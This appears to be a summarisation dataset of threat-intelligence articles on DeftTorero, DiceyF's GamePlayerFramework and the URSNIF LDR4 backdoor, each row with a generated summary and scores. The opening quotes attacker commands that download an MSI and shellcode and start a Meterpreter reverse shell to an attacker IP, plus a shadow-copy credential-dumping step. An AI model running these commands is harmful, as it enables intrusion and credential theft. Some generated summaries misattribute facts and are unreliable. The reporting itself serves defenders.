=([text.encoding]::ASCII).G?tBytes($sendback2),$str?am.Write($sendbyte,0,$sendbyte.Length),$stream.Flush()},$client.Close()"" 2>&1 cmd.exe /c ""msi?xec /q /i http://200.159.87[.]196/1.msi 2>&1 cmd.exe /c ""Powersh?ll.ex? -NoP -NonI -W Hidden -Ex?c Bypass IEX (New-ObjectNet.WebClient).DownloadString('htt?s://raw.githubusercontent[.]com/cheetz/PowerSploit/master/CodeEx?cution/Invoke-Shellcode.ps1'), Invoke-Shellcode -Payload windows/met?rpreter/reverse_https -Lhost200.159.87[.]196 -Lport 3306 -Force 2>&1 PowerShell command to invoke a Meterpreter sessionTable. 3 Operator commands to establish further presence on other servers in the same networkCredentials: the more, the betterWhile the same credential dumping strategy has been used by the operators in most intrusions, there were some instances where few modifications were seen. For example, the operators used the VSSADMIN system tool to create a shadow copy snapshot on the targeted server in an attempt to dump domain credentials, a technique also used in pentesting and red team engagement.Command Comment CMD /C vss?dmin create shadow /for=E: Create a volume shadow copy to collect SAM and SYSTEM registry hives from local system, or NTDS.DIT and SYSTEM hives if on a domain controller CMD /C vss?dmin list shadows /for=E:> Test if the above command workedTable. 4 Creating a shadow copyDefense Evasion: Explosive RAT modificationsWe've barely seen Explosive RAT since 2019. However, it's worth mentioning the tricks the author used in the versions that we know of. While the functionality of the malware didn't change that much over time, the author made an effort to ensure its files wouldn't be detected using publicly available signatures. The changes introduced were minimal but sufficient. The table below illustrates some changes made by the malware author. It is also noticeable that some strings mentioned in previous Yara rules disappeared from the newer version.New Pattern Old Pattern Pattern Description DOD DLD Delimiter used for malware configuration variables Mozilla/5.0 (Windows NT 6.0, WOW64, rv:32.0) Gecko/20200101 Firefox/32.0 Mozilla/4.0 (compatible, MSIE 7.0, MSIE 6.0, Windows NT 5.1, .NET CLR 2.0.50727) User Agent for HTTP CommunicationTable. 5 Pattern changes in the newer Explosive RAT campaignA second noticeable change made to evade defense was introduced to the function names exported by the DLL component of Explosive RAT. Below is a list of changes in the export table.New Function Name Old Function Name AllDataGet GetAllData HistoryGetIE GetIEHistory TOCN CON FnClipOpen OpenClipFn HoKSetWin SetWinHoK appregister Registerapp ProcessPath PathProcessTable. 6 New function names compared to the old ones used in the 2015 campaignVictimsBased on our telemetry, the indicators of the intrusions we assessed between late 2019 and mid-2021 are similar to the usual DeftTorero victimology, with a clear focus on Middle Eastern countries such as Egypt, Jordan, Kuwait, Lebanon, Saudi Arabia, Turkey and the United Arab Emirates.The targeted web servers occasionally host multiple websites belonging to different industry verticals such as Corporate, Education, Government, Military, Media, and Telcos. This presents the threat actor with the opportunity to pivot to other victims of interest.ConclusionsIn this post, we described the potential tactics, techniques and procedures identified in previous DeftTorero intrusions that were largely missing from public reports. As our telemetry and public reports did not identify any new Explosive RAT detections after 2020, but only old slightly modified toolsets (e.g., Explosive RAT, webshells, etc.), the historical intrusions analysis we conducted suggest a potential TTP shift by the threat actor to more fileless/LOLBINS techniques, and the use of known/common offensive tools available on the internet. This TTP shift could explain the detection gap in previous years because using fileless techniques and public tools allows the operators to blend in with other threat activities.There are two recommended defensive measures to combat such intrusions, aside from assessing web vulnerabilities, namely, monitoring web server file integrity and occasionally scanning web server backups, we have noticed that some of the threat actor post-exploitation tools were actually inside website backups, and continued to exist after the initial intrusion. If the backups were restored at a later stage, the threat actor could regain persistent access and continue where they left off.If you want to learn more about DeftTorero activity and defense against this group, contact the Kaspersky Intelligence Reporting service at intelreports@kaspersky.com.Indicators of CompromiseNote: We provide an incomplete list of IoCs here that are valid at the time of publication. A full IoC list is available in our private report.File hashes53EE31C009E96D4B079EBE3267D0AE8E Explosive RAT EXE 54EBC45137BA5B9F5ECE35CA40267100 Explosive RAT EXE A955B45E14D082F71E01EBC52CF13DB8 Explosive RAT EXE E952EC767D872EA08D8555CBC162F3DC Explosive RAT EXE ED50613683B5A4196E0D5FD2687C56DA Explosive RAT EXE 0a45de1cdf39e0ad67f5d88c730b433a cmd.aspx (basic ASPX webshell) 0d6bc7b184f9e1908d4d3fe0a7038a1e c.aspx/conn.aspx (Tunna webshell) c87a206a9c9846a2d1c3537d459ec03a the.aspx (ASPX webshell) 02BCD71A4D7C3A366EFF733F92702B81 devel.aspx (Devel webshell) D6A82B866F7F9E1E01BF89C3DA106D9D Banner.aspx (reGeorg webshell) C59870690803D976014C7C8B58659DDF 03831a5291724ef2060127f19206eiab.aspx (webshell) 1ED9169BED85EFB1FD5F8D50333252D8 aram.aspx (Caterpillar webshell) 2D804386DE4073BAD642DFC816876D08 Pavos.aspx (Caterpillar webshell) 523AA999B9270B382968E5C24AB6F9EB Report_21.jpg (ASPX webshell) 45d854e66631e5c1cda6dbf4fea074ce aspxspy2014final.aspx (ASPXSpy webshell) Bb767354ee886f69b4ab4f9b4ac6b660 sec4ever.aspx (Sec4ever webshell) 0152de452f92423829e041af2d783e3f editor.aspx (basic ASPX webshell) 7981f1bf9b8e5f4691e4ac440f1ba251 devilzshell.aspx (devilzshell webshell) 4b646e7958e1bb00924b8e6598fe6670 nightrunner.aspx (Nightrunner webshell) D608163a972f43cc9f53705ed6d31089 mini.php (PHP webshell)Post exploitation";The ITSecurity report indicates that the threat actor was able to gain access to the victim's network by exploiting an unpatched vulnerability in the victim's web server. Once the threat actor gained access to the victim's network, the threat actor deployed a webshell on the victim's web server. The threat actor then used the webshell to gain access to the victim's internal systems, or reachable systems that are likely using the stolen credentials (e.g., trusted partners). Further commands were executed to bypass the AV engine and establish a Meterpreter session with the operators' C2 server. After a Meterpreter session is established, the operators attempt to again invoke Mimikatz variants to gain system and/or domain credentials. It's worth mentioning that in older intrusions, the threat actor deployed Explosive RAT instead of using Meterpreter.;en;{'r': 0.08361581920903954, 'p': 0.9024390243902439, 'f': 0.15305067062985447};{'r': 0.05235940530058177, 'p': 0.7363636363636363, 'f': 0.09776704764396324};{'r': 0.08361581920903954, 'p': 0.9024390243902439, 'f': 0.15305067062985447}
https://securelist.com/diceyf-deploys-gameplayerframework-in-online-casino-development-studio/107723/;DiceyF deploys GamePlayerFramework in online casino development studio;"The Hacktivity 2022 security festival was held at the MOM Cultural Center in Budapest, Hungary, over two days, October 6-7th 2022. One of several presentations by our GReAT researchers included an interesting set of APT activity targeting online casino development and operations environments in Southeast Asia. A recorded video of the presentation is already online. You can watch it here:All of our research, including a full set of IoCs and Yara rules, is written up in the two-part report ""DiceyF Deploys GamePlayerFramework in Online Casino Development Studio"", already available to our private report subscribers. Some technical analysis from the report is provided here, along with a reference set of IoCs. You can find more information about trial and pay report subscription options at intelreports@kaspersky.com.Who is at the tableWe call this APT ""DiceyF"". They have been targeting online casinos and other victims in Southeast Asia reportedly for years now. Our research shows overlap with LuckyStar PlugX, a supply chain incident privately reported. TTPs, secure messaging client abuse, malware, and targeting demonstrate that this set of activity and resources align with Earth Berberoka/GamblingPuppet activity discussed at Botconf 2022 by Trend Micro researchers, also discussed as an unknown or developing cluster by other vendors. Prior to ""Operation Earth Berberoka"", Trend Micro reported on ""Operation DRBControl"", which also aligns with this activity and resource set.So, do we have another Ocean's Eleven Clooney-Pitt duo targeting the largest casinos for shocking levels of criminality, revenge, and theft? No we don't. In the related DiceyF incident that we report on, there was no evidence observed to date of immediate financial motivation or cash theft. Instead, previous incidents reported by TrendMicro researchers have exhibited customer PII database exfiltration and source code theft. Possibly we have a mix of espionage and IP theft, but the true motivations remain a mystery.Rolling the diceAn interesting combination of detections and characteristics sparked interest in this activity. These data points includedPlugX installers signed by a potentially stolen digital certificate from a secure messaging client development studioMalware distribution via an employee monitoring system and a security package deployment serviceUnusual .NET code signed with the same potentially stolen certificate and calling back to the same domain as the PlugX C2In November 2021, multiple PlugX loaders and payloads were detected in a network, which is often a wearisome topic to investigate. However, this time, the PlugX installer triad was deployed via two methods as an executable signed with a legitimate digital certificate -- an employee monitoring service and a security package deployment service. This legitimate digital certificate appeared to have been stolen from a development and build studio for a secure messaging client. These PlugX payloads communicated with a C2 at apps.imangolm[.]com. Not much later, this same security package deployment service was used to push GamePlayerFramework downloaders, with these downloaders communicating with the same C2, and signed with the same digital certificate.Further research revealed a targeting profile suggesting an online casino development studio, and later, recruited/outsourced development systems on disparate networks. Waves of .NET downloader deployments followed and coincided with the PlugX deployments, signed by the same digital certificate.These downloaders maintained PDB strings with ""PuppetLoader"" filepaths. These PuppetLoader strings pretty clearly connected the multistage loaders with past PuppetLoader downloaders, only this time, redesigned and rewritten in C. Past PuppetLoaders, written in C++, maintain explicit strings:The new .NET code maintains similar strings, reflecting the previous codebase from several years ago.While these findings were being analyzed and reported, the folks from Trend Micro reported on GamblingPuppet/Earth Berberoka at Botconf, and we are confident that this DiceyF GamePlayerFramework activity is a subsequent campaign with a newly developed core malware set. This APT, DiceyF, aligns the previously reported GamblingPuppet and Operation DRBControl resources and activity, which we also observed in earlier data as well:PlugX and PuppetLoader multistage loaderOnline casino targeting in Southeast AsiaLack of evidence presenting a financial motivation (Trend Micro observed customer database and source code exfiltration in Operation DRBControl)Chinese language in use, particularly GamePlayerFramework error strings and plugin names and pathsData theft focus for backdoors includes keystrokes and clipboardStolen digital certificate re-useObscure secure messaging client as delivery vehicle for malware and cloak for malicious activityGamePlayerFramework is a complete C rewrite of the previously mentioned PuppetLoader C++/assembly malware. This ""framework"" includes downloaders, launchers, and a set of plugins that provide remote access and steal keystrokes and clipboard data. The newer (summer 2022) executables are mostly all 64-bit .NET compiled with .NET v4.5.1, but some are 32-bit, or DLLs and compiled with .NET v4.0. There are at least two branches to this framework, ""Tifa"" and ""Yuna"", and both branches maintain new modules, incrementally modified over time:D:\Code\Fucker\GamePlayerFramework\Tifa\*.pdbC:\Users\fucker\Desktop\Fucker\GamePlayerFramework\Tifa\*.pdbD:\Code\Fucker\GamePlayerFramework\Yuna\*.pdbFinalFantasy code quirksPlayers may be familiar with the FinalFantasy game series, where Tifa and Yuna are two of the main characters. The Tifa and Yuna branches are different from one another: the Tifa branch includes only a downloader and a ""core"" module, the Yuna branch includes a downloader, plugins, and various PuppetLoader components, at least a dozen in total. Even the downloaders are fairly different from one another. As a matter of fact, the Yuna.Downloader code changes quite a bit over time, including with JSON parsing, logging, and encryption capabilities. Ongoing code development is on display here.The Tifa branch of code was deployed to victims first in November 2021, and these Tifa downloaders maintain more primitive functionality than the later Yuna downloaders. Additionally, it appears that code-signing coordination was not well organized in November. Except for one Tifa executable that was signed, two of the three Tifa downloaders were unsigned code, unlike the Yuna downloaders.The initial Tifa downloaders were already using ""Mango"" and ""Mongo"" function names just like artifacts found in Yuna downloaders, along with the aforementioned apps.imangolm[.]com C2 used by the PlugX implant. Later Yuna downloaders were distributed with the filename ""mango.exe"". Two of the Tifa.Downloader variants introduced a ""DownloaderVersion"" string, likely for the attackers to maintain backwards compatibility on the server side. Some later Yuna.Downloader variants increase in functionality and complexity, but multiple early variants and the Tifa branch are quite simple.Loading the frameworkOnce downloaded and persistence set up, multiple components load the framework. The overall process of loading the framework can be summarized with the following graph:This load sequence results in running the ""Launcher"" component. Despite the name, the main functionality of this module is not to perform launching. Instead, it is the orchestrator of the framework, i.e. it manages all the framework components. After completing the startup process, the orchestrator starts sending heartbeat packets to the C2 server every 20 seconds. Each such packet is a XOR-encrypted JSON object that contains the following information:Username of the logged-in userCurrent user session status (locked or unlocked)Size of logs collected by the clipboard recorder pluginCurrent date and timeThe C2 responds with one of fifteen commands.Command name Command arguments Description PluginKeepAlive, KeepAlive N/A Updates an internal timestamp with the last C2 response time PluginDestory [sic] N/A Shuts down the framework GetSystemInfo N/A Retrieves various system information, namely: Local network IP addressesAvailable privileges (SYSTEM, administrator or normal user)Network protocol used for C2 communication (hardcoded to Tcpv4 in all discovered samples)Framework version (in format yyyymmdd.xx, e.g. 20220506.00)Downloader module versionCPU nameAvailable RAMOperating system versionAddress of the C2 server that is in useSize of clipboard recorder logsInstalled security solutionBIOS serial numberMAC addressesMachine boot time FastCmd Command: command to be executed Allows execution of shell commands, this command creates a new cmd.exe process with redirected standard input and output and sends commands to it, the output of executed commands is sent back to the C2 server GetDomainSetting N/A Sends the list of C2 servers specified in the configuration to the current C2 server SetDomainSetting DomainConfig: IP addresses and ports of new C2 servers Updates the list of C2 servers in the configuration by writing new C2 server addresses to the file C:\ProgramData\NVIDIA\DConfig GetRemotePluginInfo PluginName: name of an installed plugin Retrieves the version of a locally installed plugin RunPlugin PluginName: name of the plugin to be launched SessionId: ID of the session inside which the plugin is to be launched Downloads a plugin from the C2 server and launches it DeleteGuid N/A Removes the infection from the machine by creating a batch file that removes all files dropped by the framework installer except for rascustoms.dll, after performing removal, the batch file deletes itself FastDownload FilePath: path of the file to be uploaded Uploads a file from the victim machine CachePlugin PluginName: name of the plugin PluginVersion: version of the plugin Downloads a plugin from the C2 server but does not launch it InstallPlugin PluginName: name of the plugin to be launched WaitForExitTimeout: timeout interval Launches a plugin on the victim machine, waiting until the plugin process finishes, in case of a timeout, the orchestrator kills the plugin process RemoteInject SubMsg: a string equal to either RunVirtualDesktop or DestoryVirtualDesktop [sic] Either starts (if SubMsg is RunVirtualDesktop) or stops (if SubMsg is DestoryVirtualDesktop) the VirtualDesktop plugin ChromeCookie SubMsg: a string equal to either RunChromeCookie or GetCookiePath If SubMsg is RunChromeCookie, launches the ChromeCookie plugin, if the argument string is GetCookiePath, returns the path where Chrome cookies are stored FirefoxCookie SubMsg: a string equal to either RunFirefoxCookie or GetCookiePath If SubMsg is RunFirefoxCookie, launches the FirefoxCookie plugin, if the argument string is GetCookiePath, returns the path where Firefox cookies are storedPlugins overviewPlugins are EXE files that execute most of the framework's malicious activities. Plugins can be configured to be downloaded from the C2 server when the framework starts up or is loaded at any other time using one of the commands above. During its execution, a plugin may connect to the C2 server and receive commands from it. Information about running plugins is stored in the C:\ProgramData\NVIDIA\DisplaySessionContainer1.ini file.All plugins of the framework are stored in a fileless way. Whenever a plugin is downloaded from the C2 server, it is loaded into the framework with the following procedure:The orchestrator selects a random port from 10000 to 20000 and launches a local TCP socket server on it.The orchestrator creates a new svchost.exe process in suspended mode and injects the api-ms-win-core-sys-l1-0-5.dll library mentioned in the ""Loading the Framework"" section.The injected library loads the PuppetLoader.Downloader component with the following arguments: -LoadName <plugin name> -PacketId <internal ID of the network packet with the plugin payload> -Port <server port generated at the first step>.The Yuna.PuppetLoader.Downloader component downloads the plugin executable from the local TCP server and loads it using Load.The strings of the orchestrator component reference the following plugin names:Plugin.???? (Acquisition System)Plugin.???? (Hidden Process)Plugin.SSHPlugin.?????? (General Purpose Plugin)Plugin.SessionCmdPlugin.???? (Port Forwarding)Plugin.???? (Screen Transfer)Plugin.???? (Virtual Desktop)Plugin.??? (Clipboard)Plugin.ChromeCookiePlugin.FirefoxCookieWhile tracking deployments of GamePlayerFramework, we observed several plugins out of the list above being used: General Purpose Plugin, Clipboard and Virtual Desktop.Malicious app with graphical interfaceThe application deployed through installation packages of security solutions was designed to mimic an application that synchronizes data of the Mango messaging application. Below is the window displayed to the victim when this application starts:Window of the malicious ""Mango Employee Account Data Synchronizer""In order to make the victim user trust the malicious window, the attackers employed social engineering. As can be seen from the screenshot above, they included the name of the victim organization and even the floor where the organization's IT department is located. At the same time, the visible window makes this application less suspicious to security solutions.When started, this application:Connects to the C2 server via a TCP socket. The address and port of the server is specified in the binary. In case connection fails, the application displays a message window with the ""????????????????! ????IT??!"" text (""Unable to connect to Mango employee data synchronization server! Please report back to the IT department"").Sends the following information to the C2 server:Version of the installed Mango messengerMachine nameCurrent usernameOperation system versionList of local IPv4 addressesReceives a JSON object containing a Boolean value named IsErrorMachine. If it is set to true, the application displays a message window with the ""???????, ??10??IT???????"" text (""Machines that have not been certified, please go to the IT department on the 10th floor to add machine certification"") and exits.Launches the exe executable located inside the same directory as the application. The internal name of this file is Yuna.Downloader.The code is under continuous incremental change and its versioning reflects a semi-professional management of the codebase modifications. Over time, the group added Newtonsoft JSON library support, enhanced logging, and encryption for logging.InfrastructureDomain IP First seen ASN apps.imangolm[.]com 202.182.115.238 20211106 20473, AS-CHOOPA quic.flashesplayer[.]com 202.182.115.238 2021-11-10 20473, AS-CHOOPA archivess.imangoim[.]net 45.77.47.149 20220506 20473, AS-CHOOPAAs described above, much of the early implants' (both PlugX and the downloaders) communications activity calls back to infrastructure by resolving FQDN for infrastructure located in Southeast Asia. Later into April 2022, some of the Yuna.Downloaders began communicating directly with a hardcoded IP address.ConclusionThere are many interesting characteristics of DiceyF campaigns and TTPs. The group modifies their codebase over time, and develops functionality in the code throughout their intrusions.Organizations need to maintain solid efforts in monitoring software deployed across their organizations. The deployment systems themselves and the deployment process require heightened monitoring and maintenance: what gets deployed, when it gets deployed, and whose credentials are being used. The systems themselves need to be hardened and security products installed and updated.GamePlayerFramework enabled DiceyF, the actor behind this framework, to perform cyberespionage activities with some level of stealth. The initial infection method is noteworthy in that the framework is distributed via installation packages deployed through security solution control centers. Furthermore, the components of this framework are signed with a digital certificate that makes the framework more trusted by security solutions. In order to further disguise the malicious components, attackers added a graphical interface to some of them. Such implants are masqueraded as components of a messenger that is used at the victim organizations. To make sure that victims did not become suspicious of the disguised implants, attackers obtained information about targeted organizations (such as the floor where the organization's IT department is located) and included it inside graphic windows displayed to victims. They also used service names, file paths, digital signing certificates, and other artifacts from NVIDIA, Mango, and other legitimate software. Plugins of GamePlayerFramework allow extensive monitoring of victim machines. For example, they are able to monitor keystrokes and the clipboard, browse websites located inside the organization's local network, or establish virtual desktop sessions. And over the course of several months, DiceyF developers added more encryption capabilities to better hide their logging and monitoring activities. In the future, we expect to see an increase in the number of plugins and observe more unusual defense evasion methods in this framework.Finally, the deployment tactic used here isn't quite as sophisticated as infecting an external component of the supply chain itself, but can be extremely effective.IOCsMD5Tifa.Downloaderddbc9081ed2c503c5e4512a8e61b5389Tifa.Core49b457ee8eaa83b18cc00d2f579824c6Yuna.Downloader06711900cc5d7cd665bc1b6ec9d7eacf1d59e527886e4bd72df0f609239b9d58Yuna.Downloader and Yuna.Launcher containing legitimate Newtonsoft DLL0c4dae01f21c3d2fa55f38314fe3495839736c93f7d9cc62cdc00438c174f8a4Yuna.Launcher07d6bf2df064e97d0e635a67f083f87d0ac4e0e08bd28e88acd4991071c98261Yuna.Plugin.Generalcb8a30fcbcb462be66462f6928c6e44aYuna.Plugin.ClipboardRecorder294c22533c950d7d9d74a82729ba3841Yuna.PuppetLoader.CodeLauncher07ff76be283fb44ce9e9427e12e63aa6Yuna.PuppetLoader.Guard031466c63bba4eafb11f2966e765c0d2Yuna.PuppetLoader.Downloader0c4dae01f21c3d2fa55f38314fe3495819f8809d04c06bba2ad95a937f133a89Yuna.PuppetLoader.ProcessLoader969ef4a64203ba2ab54a6822559600ccYuna.Downloader.DLL.Core56836b19b5c35c81e006f4843ff63e51Mango.Sync.Updater3a1780e6fb6250b0fb63d2884788670e4d72e573d9c4d31371c8020ba7179dafVPN spoofing DLL193d192ed0cec2487d18b13aedc94cb6rascustoms.dll2bd3b84b318beb5714cac9194078607aDomainsapps.imangolm[.]comarchivess.imangoim[.]netPDB pathsD:\Code\Fucker\GamePlayerFramework\Yuna\Yuna.Downloader\obj\Release\Yuna.Downloader.pdbD:\Code\Fucker\GamePlayerFramework\Yuna\Yuna.Launcher\obj\Release\Yuna.Launcher.pdbD:\Code\Fucker\GamePlayerFramework\Yuna\Yuna.Plugin.ClipboardRecorder\obj\Release\Yuna.Plugin.ClipboardRecorder.pdbD:\Code\Fucker\GamePlayerFramework\Yuna\Yuna.Plugin.General\obj\Release\Yuna.Plugin.General.pdbD:\Code\Fucker\GamePlayerFramework\Yuna\Yuna.Plugin.Installer\obj\Release\Yuna.Plugin.Installer.pdbD:\Code\Fucker\GamePlayerFramework\Yuna\Yuna.PuppetLoader.CodeLauncher\obj\Release\VpnSohDesktop.pdbD:\Code\Fucker\GamePlayerFramework\Yuna\Yuna.PuppetLoader.Downloader\obj\Release\Yuna.PuppetLoader.Downloader.pdbD:\Code\Fucker\GamePlayerFramework\Yuna\Yuna.PuppetLoader.Guard\obj\Release\Yuna.PuppetLoader.Guard.pdbD:\Code\Fucker\GamePlayerFramework\Yuna\Yuna.PuppetLoader.ProcessLoader\obj\Release\Yuna.PuppetLoader.ProcessLoader.pdb";"The ITSecurity report summarizes the malicious activity of DiceyF, an APT targeting online casinos in Southeast Asia. DiceyF is a complete C rewrite of the previously mentioned PuppetLoader C++/assembly malware. This ""framework"" includes downloaders, launchers, and a set of plugins that provide remote access and steal keystrokes and clipboard data. The newer (summer 2022) executables are mostly all 64bit .NET compiled with .NET v4.5.1, but some are 32bit, or DLLs and compiled with .NET v4.0. There are at least two branches to this framework, ""Tifa"" and ""Yuna"", and both branches maintain new modules, incrementally modified over time. The Tifa branch of code was deployed to victims first in November 2021, and these Tifa downloaders maintain more primitive functionality than the later Yuna downloaders. Additionally, it appears that codesigning coordination was not well organized in November. Except for one Tifa executable that was signed, two of the three Tifa downloaders were unsigned code, unlike the Yuna downloaders. The initial Tifa downloaders were already using ""Mango"" and ""Mongo"" function names just like artifacts found in Yuna downloaders, along with the aforementioned apps.Plugins overviewPlugins are EXE files that execute most of the framework's malicious activities. Plugins can be configured to be downloaded from the C2 server when the framework starts up or is loaded at any other time using one of the commands above. During its execution, a plugin may connect to the C2 server and receive commands from it. Information about running plugins is stored in the C:\ProgramData\NVIDIA\DisplaySessionContainer1.ini file.The T";en;{'r': 0.14895549500454133, 'p': 0.9647058823529412, 'f': 0.2580645138117703};{'r': 0.099124020285846, 'p': 0.8958333333333334, 'f': 0.1784972999909534};{'r': 0.148047229791099, 'p': 0.9588235294117647, 'f': 0.2564909496890323}
https://www.mandiant.com/resources/blog/rm3-ldr4-ursnif-banking-fraud;From RM3 to LDR4: URSNIF Leaves Banking Fraud Behind;"A new variant of the URSNIF malware, first observed in June 2022, marks an important milestone for the tool. Unlike previous iterations of URSNIF, this new variant, dubbed LDR4, is not a banker, but a generic backdoor (similar to the short-lived SAIGON variant), which may have been purposely built to enable operations like ransomware and data theft extortion. This is a significant shift from the malware's original purpose to enable banking fraud, but is consistent with the broader threat landscape.Mandiant believes that the same threat actors who operated the RM3 variant of URSNIF are likely behind LDR4. Given the success and sophistication RM3 previously had, LDR4 could be a significantly dangerous variant--capable of distributing ransomware--that should be watched closely.Brief HistoryBeing one of the oldest banking malware families still active today, it is no surprise that there is a long and adventurous history behind URSNIF (aka. Gozi or Gozi/ISFB), which is sometimes intertwined with other malware families and variants. Its source code was leaked at least twice since the first major version appeared in 2016, resulting in other variants, from which multiple are still in circulation today (e.g., IAP). This means neither Gozi nor URSNIF is a single malware family, but more like a set of related siblings (usually called variants). Most researchers today have standardized on the malware family name Gozi, but for mainly historical reasons, other researchers and vendors--including Mandiant--still reference these variants as URSNIF (the older malware from which Gozi originated from back in the mid-2000s with Haxdoor) or even ISFB (which is technically the latest living branch of this banking malware family). Just to make things clear, we use URSNIF (capitalized, according to Mandiant's naming scheme) throughout this blog post when referring to the current variants that are still active today.In recent years, multiple variants of URSNIF, based on ISFB, have been observed in the wild including:Dreambot - One of the most successful variantsIAP - The most actively developed and distributed ISFB branch with frequent malware campaigns coming from CUTWAIL and targeting ItalyRM2 - Also widely known as GoziAT, started its activity years ago with the Chanitor malware (aka Hancitor)RM3 - Due to its custom executable file format, it is the most sophisticated version to date, which has mostly impacted Oceania and UK since 2017As of writing this, our research indicates ISFB might be the last and only active branch of the infamous URSNIF banking malware. Over the past three years, this banking malware has seen some interesting changes, which suggest a major paradigm shift and that the entire project was redesigned.Figure 1: Genealogy of different URSNIF branches and variantsFrom a malware developer's perspective, it is a complicated task to provide updates for so many different projects (or forks in this case), which inevitably leads to dead-ends and mistakes. Mandiant believes that IAP 2.0 & RM2 builds over version 2.50.000 and RM3 builds over version 3.00.700 focused on removing unnecessary features and merges all forks and development branches into a single main branch. Some of the notable changes intended to support this unification effort includeThe RSA public key is now encrypted with a very specific embedded decryption key, and this has been progressively pushed into all variantsAES encryption replaced the older Serpent encryptionMerging and simplification of fields in the beacon requestsThe year 2020 was highly unsuccessful for the RM3 variant, with decreasing reliable distributions and multiple backends that collapsed (mostly in Europe). Furthermore, this specific variant failed to take the opportunity to grow its popularity to obtain market share with the disruption of TRICKBOT and EMOTET. One of the greatest winners of this was the ICEDID malware family, which managed to leverage the shrinking competition on the banking malware landscape, putting RM3 into a difficult situation. It was extremely unusual for URSNIF's ISFB variant to not receive any updates after June 2020, thus some researchers hypothesized that the only way for this banking malware to return was to do some major refurbishing on its code. In June 2022, with Internet Explorer finally being fully removed from Microsoft Windows, the RM3 variant was officially seen as a ""dead"" malware from a technical point of view, as RM3 was reliant on this browser for some of its critical network communication.DistributionMandiant first observed LDR4 in the wild on June 23, 2022, via a recruitment related lure, resembling RM3's distribution reported back in April 2021 (Figure 2). The email contains a link to a compromised website that redirects to a domain masquerading as a legitimate company (Figure 3). A CAPTCHA challenge is presented to download an Excel document purported to contain information related to the email lure (Figure 4 and Figure 5). This document then downloads and executes the LDR4 payload. A similar chain leading to LDR4 was later observed but with a lure pertaining to an accounting software instead (Figure 6).In addition to HR/recruitment, Mandiant also observed RM3 in the more conventional payment/invoice lures that leverage XLM 4.0 macros in Excel document attachments to download the payload. In April 2022, we observed its last distribution via UNC2420 as a downloaded payload of the MOTEISLAND document. Mandiant tracks UNC2420 as a distribution threat cluster that uses malicious Microsoft Word documents as attachments in campaigns using subjects that appear to be replies to legitimate email chains.Figure 2: Email lure for URSNIF (RM3) in April 2021Figure 3: Email lure for URSNIF (LDR4) on June 23, 2022Figure 4: June 2022, CAPTCHA page for the Excel document downloadFigure 5: Excel document downloader for URSNIF (LDR4) on June 24, 2022Figure 6: Email lure for URSNIF (LDR4) on June 24, 2022Static AnalysisThe LDR4 variant appears as a DLL module on the infected computer, which is invoked via the DllRegisterServer function, but there are often other randomly named decoy functions exported to confuse sandboxes. Some of the binaries were using valid code-signing certificates (e.g., NAILS UNLIMITED LIMITED and ANGOSTONE GROUP LTD LIMITED). The binaries can have either a 32-bit or 64-bit architecture and are packed with various PE crypters. One of the crypters, tracked by Mandiant as SPELLBOOK, has an interesting property that it leaves the signature ""|SPL|"" in memory after unpacking the core malware. We identified overlaps in the usage of this crypter between URSNIF LDR4 and SNOWCONE.GZIPLOADER (ICEDID's loader component). The unpacked core for the analyzed URSNIF LDR4 sample has the internal name LOADER.dll.URSNIF LDR4 is a mix of code refactoring, regressions and interesting simplification strategies.Figure 7: IAP/RM3/LDR4 payload structuresWe made the following major observations:The PX era is now over.The LDR4 variant no longer uses the custom PX executable format, that was first introduced by the RM3 variant. We believe this choice was made to avoid overcomplicating the troubleshooting of software issues. From a developer's point of view, spending more time that is supposed into some superficial layer of issues and refocusing into more important pipelines of requested features are crucial for your reputation. Equally important, given the notoriety of the PX format among analysts and AV/EDR products, it was only a matter of time for that path to come to an end. From the attacker's perspective, investing in a product that everyone knows how to detect, is not a very efficient use of resources, so going back to the roots with a classic PE format is in fact a rational choice on their side. FJ.exe gone or reworked?Since the beginning of ISFB, a steganography tool called FJ.exe (File Joiner) is used for hiding multiple files into a single payload. This one isn't unique to ISFB but forked from another notorious banking malware called CARBERP. By comparing the code of those two, there are no doubts this same program is used in both. Figure 8: ISFB FJ.exe overlapping code with CARBERP FJ.cpp Malware Family PDB Path / Project Path Carberp bootkit.old/FJ/ ISFB d:\work\projects\bk2\bin\release\i386\FJ.pdb (The bk2 project name in the file path stands for ""Bootkit v2"") FJ.exe is the tool responsible for creating the JJ, J1, J2, or WD fields on URSNIF payloads based on the variant. But in LDR4 those magic bytes are missing, and the hidden files usually hardcoded at the end of the payload are now gone. LDR4 is a backdoor.URSNIF is the latest malware following the same path that EMOTET and TRICKBOT did before, by focusing into a new strategy and leaving behind its banking fraud legacy. LDR4 is the proof of that statement by removing all its banking malware features and modules and only focusing into getting VNC and/or remote shell into the compromised machine.ObfuscationIt is a common practice in offensive software operations to apply some sort of obfuscation to the code itself or at least to API calls to thwart analysis efforts. URSNIF historically did not use this (except for the outermost crypter layer used for AV evasion). However, this new LDR4 variant incorporated obfuscation for the Windows API calls. First, it builds a hash lookup table from the export names and addresses of the Windows modules used by the malware (kernel32, ntdll, crypt32, advapi32, ws2_32), that maps the JAMCRC32 checksum (JAMCRC32 is the modification of the regular CRC32 algorithm, where all the bits of the final checksum are flipped) of the function names to their respective virtual addresses in memory. Later in the code, any invocation to the Windows API functions will just look up the checksum value in the table to quickly retrieve the function address. Apart from this, no further code obfuscation is leveraged in the compiled binaries, making LDR4 a relatively easy family to reverse engineer.BehaviorOne of the most noticeable things during analysis was that the developers had simplified and cleaned up various parts of the code, compared to previous variants. Most notably, its banking features were totally scrapped.The malware first locates the .bss section in the executable, and decrypts it using a simple XOR-based algorithm. This is performed with a key that is constructed of the PE Timestamp, and the section's PointerToRawData and SizeOfRawData fields. To ensure that the decryption was successful, it calculates a checksum on part of the decrypted data, which must match the checksum of the UTF-16 encoded string ""All rights reserved."". This checksum will be used in later operations as a XOR key (similar to the XOR cookie value used in leaked source code, which refers to this value as CsCookie).Next, it gathers a list of system services by enumerating the subkeys under the registry key HKLM\SYSTEM\CurrentControlSet\Control, and it generates two separate IDs: a System ID, which is derived from the creation date of pagefile.sys or hiberfil.sys - which is exactly the way how the RM3 and SAIGON variants did it, and a User ID, which is simply the MD5 hash of the current user's username.To ensure that only one instance of the malware is active at a time, it creates a mutex with a randomized name, where the System ID created in the previous step is used as a random seed value. Then the decrypted configuration (from the .bss section) is validated to see if it contains both the required bot configuration and an RSA public key that is used for decrypting data from the command and control (C2) servers. This is followed by launching the main communication thread via the QueueUserAPC () function.The main communication loop retrieves the C2 server information from the embedded bot config.If the IdleTime option is present in the configuration, then the code waits for this many seconds before starting communication with the servers.If the RunCommand option is present, its value is executed in a separate thread with the output of the command redirected to a temporary file. All the 